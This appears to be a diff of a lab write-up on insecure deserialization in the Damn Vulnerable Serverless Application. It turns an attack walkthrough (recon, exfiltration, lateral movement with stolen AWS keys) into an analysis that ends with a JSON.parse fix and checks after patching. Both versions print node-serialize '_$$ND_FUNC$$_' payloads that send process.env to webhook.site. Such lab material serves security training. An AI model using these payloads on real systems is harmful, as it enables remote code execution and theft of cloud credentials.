@@ -1,164 +1,81 @@
-# Lesson 1: Remote Code Execution via Insecure Deserialization
+# Security Analysis: Event Injection (Unsafe Deserialization) in DVSA
 
-This guide provides a comprehensive walkthrough for replicating an **Insecure Deserialization** attack within the **Damn Vulnerable Serverless Application (DVSA)**. By exploiting the `node-serialize` library, we will achieve Remote Code Execution (RCE) on an AWS Lambda function to exfiltrate environment variables and move laterally through the cloud environment.
 
------
+## 1. Setup & Deployment
+To replicate this analysis, you must first deploy the DVSA environment on AWS.
 
-## 📋 Prerequisites
+1.  **Deploy the Stack:** Use the AWS CloudFormation or SAM templates provided in the original DVSA repository to provision the infrastructure (API Gateway, Lambda, S3, Cognito).
+2.  **Access the API:** Identify the `/order` endpoint from the API Gateway console.
+3.  **Authentication:** Log into the DVSA frontend to obtain a valid **Authorization Bearer Token (JWT)**, which is required for interacting with the Order Manager.
 
-Before starting, ensure you have the following tools configured:
+---
 
-  * **AWS CLI**: Configured with basic user permissions.
-  * **Burp Suite**: Community or Professional edition.
-  * **Browser**: Configured to proxy traffic through Burp.
-  * **Webhook.site**: For receiving exfiltrated data.
-  * **CyberChef**: For decoding Base64 payloads.
+## 2. Vulnerability Replication (Exploitation)
+### The Root Cause
+The `DVSA-ORDER-MANAGER` function uses the `node-serialize` package to process incoming request bodies. This package is vulnerable to code injection because it can evaluate strings as executable functions if they are prefixed with `_$$ND_FUNC$$_`.
 
------
+### Step-by-Step Guide
+1.  **Intercept the Request:**
+    Open **Burp Suite** and navigate to the DVSA frontend. Go to "My Orders" and intercept the `POST` request sent to `/order`.
+2.  **Identify the Sink:**
+    The backend code at `functions/DVSA-ORDER-MANAGER/handler.js` uses `serialize.unserialize(event.body)`. This is where the malicious input is executed.
+3.  **Craft the Malicious Payload:**
+    Prepare a payload that collects environment variables (`process.env`) and sends them to an external listener (e.g., [Webhook.site](https://webhook.site)).
+    ```json
+    {
+      "action": "_$$ND_FUNC$$_function() { const env = JSON.stringify(process.env); require('https').get('https://webhook.site/YOUR_ID?data=' + Buffer.from(env).toString('base64')); }()"
+    }
+    ```
+4.  **Execute the Attack:**
+    Send the modified request via **Burp Repeater**.
+5.  **Confirm Exfiltration:**
+    Monitor your Webhook.site dashboard. A new request should arrive containing a Base64-encoded string. Use **CyberChef** to decode the data, which will reveal sensitive information including `AWS_ACCESS_KEY_ID`, `AWS_SESSION_TOKEN`, and user JWTs.
 
-## 🛠️ Phase 1: Reconnaissance & Authentication
+---
 
-First, we need to identify our targets and obtain a valid session token to interact with the API.
+## 3. Remediation & Patching
+### The Fix Strategy
+To secure the application, we implement **Safe Deserialization**. We replace the `node-serialize` library with the native `JSON.parse()` method, which treats all input strictly as data and does not support function evaluation.
 
-### 1\. Discover Cognito User Pool
+### Technical Implementation
+1.  **Locate the File:** Navigate to `functions/DVSA-ORDER-MANAGER/handler.js` in the AWS Lambda console.
+2.  **Modify the Code:** Remove the `node-serialize` requirement and update the parsing logic.
 
-Run the following command to find the user pool associated with the application:
-
-```bash
-aws cognito-idp list-user-pools --max-results 10
-```
-
-*Note the `Id` (e.g., `us-east-1_vZY6XMozc`).*
-
-### 2\. Get Cognito Client ID
-
-Identify the client ID for the specific user pool:
-
-```bash
-aws cognito-idp list-user-pool-clients --user-pool-id <YOUR_USER_POOL_ID>
-```
-
-### 3\. Obtain Access Token
-
-Authenticate using your credentials to get a Bearer token:
-
-```bash
-TOKEN=$(aws cognito-idp admin-initiate-auth \
-  --auth-flow ADMIN_NO_SRP_AUTH \
-  --user-pool-id <YOUR_USER_POOL_ID> \
-  --client-id <YOUR_CLIENT_ID> \
-  --auth-parameters USERNAME=<email>,PASSWORD=<password> \
-  --query 'AuthenticationResult.AccessToken' \
-  --output text)
-
-echo $TOKEN
-```
-
------
-
-## 🔍 Phase 2: API Discovery
-
-We need the endpoint for the `DVSA-ORDER-MANAGER` function.
-
-### 1\. Locate API Gateway URL
-
-Find the REST API ID and the deployment stage:
-
-```bash
-aws apigateway get-rest-apis
-aws apigateway get-stages --rest-api-id <API_ID>
-```
-
-**Target URL:** `https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order`
-
-[Image of AWS API Gateway to Lambda architecture]
-
------
-
-## 🚀 Phase 3: Exploitation (The Injection)
-
-We will use Burp Suite to intercept a legitimate request and inject our malicious payload.
-
-### 1\. Intercept the Request
-
-1.  Open the DVSA application in your proxied browser.
-2.  Navigate to the **Orders** tab.
-3.  In Burp Suite (**Proxy \> Intercept**), ensure Intercept is **ON**.
-4.  Refresh the page. When the `POST /order` request appears, right-click and select **Send to Repeater**.
-
-### 2\. Craft the RCE Payload
-
-The vulnerability exists because the `action` parameter is passed to `unserialize()`. We use the `_$$ND_FUNC$$_` prefix to trigger an IIFE (Immediately Invoked Function Expression).
-
-**The Logic:**
-We want to stringify `process.env` (which contains AWS keys), encode it to Base64 (to avoid breaking the URL), and send it to our Webhook.
-
-**The Payload:**
-
+#### Crucial Patch Code:
 ```javascript
-"_$$ND_FUNC$$_function(){var h=require('https');h.get('https://webhook.site/<YOUR_ID>?' + Buffer.from(JSON.stringify(process.env)).toString('base64'));}()"
-```
+// REMOVED: const serialize = require('node-serialize');
 
-### 3\. Modify and Send in Repeater
+// ... inside the handler function ...
 
-In the Repeater tab, update the JSON body:
-
-```json
-{
-  "action": "_$$ND_FUNC$$_function(){var h=require('https');h.get('https://webhook.site/<YOUR_ID>?' + Buffer.from(JSON.stringify(process.env)).toString('base64'));}()",
-  "cart-id": "123"
+// PATCHED LOGIC: Use JSON.parse for safe data handling
+let req;
+try {
+    req = typeof event.body === 'string' ? JSON.parse(event.body) : (event.body || {});
+} catch (e) {
+    return { statusCode: 400, body: JSON.stringify({ message: "Invalid JSON" }) };
 }
+
+// Ensure the code no longer calls serialize.unserialize(event.headers) or event.body
 ```
 
-Hit **Send**.
+3.  **Deploy:** Click the **Deploy** button in the Lambda console to apply the changes.
 
------
+---
 
-## 🔓 Phase 4: Exfiltration & Decoding
+## 4. Verification After Fix
+1.  **Repeat the Exploit Attempt:**
+    Send the same malicious `_$$ND_FUNC$$_` payload using Burp Repeater.
+2.  **Observe Results:**
+    * **Backend Response:** The API should return an "unknown action" error or a `400 Bad Request`.
+    * **Attacker Dashboard:** Check Webhook.site. No new requests should be received, proving that code execution failed.
+3.  **Functional Check:**
+    Navigate to the frontend and view "My Orders." The orders should load normally, confirming that legitimate traffic is still handled correctly by `JSON.parse()`.
 
-### 1\. Capture the Data
+---
 
-Go to your [Webhook.site](https://www.google.com/search?q=https://webhook.site) dashboard. You should see a new incoming **GET** request. The query string (after the `?`) is your Base64 encoded environment data.
+## Security Best Practices
+* **Avoid Unsafe Packages:** Never use libraries like `node-serialize` or `unserialize` on user-controlled data.
+* **Principle of Least Privilege:** Minimize the permissions of the Lambda Execution Role to ensure that even if code execution is achieved, the attacker cannot access other AWS resources.
+* **Input Validation:** Implement strict schema validation (e.g., using Joi or AJV) to ensure only expected fields are processed.
 
-### 2\. Decode via CyberChef
-
-1.  Copy the long string from Webhook.site.
-2.  Open **CyberChef**.
-3.  Use the **From Base64** recipe.
-4.  Use the **JSON Beautify** recipe.
-
-**Extracted Credentials:**
-Look for `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`.
-
------
-
-## 🏃 Phase 5: Lateral Movement
-
-Now that we have the Lambda's temporary credentials, we can act as the Lambda service itself.
-
-### 1\. Assume the Role
-
-```bash
-export AWS_ACCESS_KEY_ID=<STOLEN_KEY>
-export AWS_SECRET_ACCESS_KEY=<STOLEN_SECRET>
-export AWS_SESSION_TOKEN=<STOLEN_TOKEN>
-
-aws sts get-caller-identity
-```
-
-### 2\. Enumerate Other Functions
-
-Since this role often has broad permissions, list other functions in the account:
-
-```bash
-aws lambda list-functions --region us-east-1 --query 'Functions[].FunctionName'
-```
-
-
-## 📝 Summary Checklist
-
-  - [ ] Obtained Cognito Token.
-  - [ ] Intercepted `POST /order` in Burp.
-  - [ ] Injected `_$$ND_FUNC$$_` payload.
-  - [ ] Decoded `process.env` in CyberChef.
-  - [ ] Verified IAM role assumption via AWS CLI.
+---
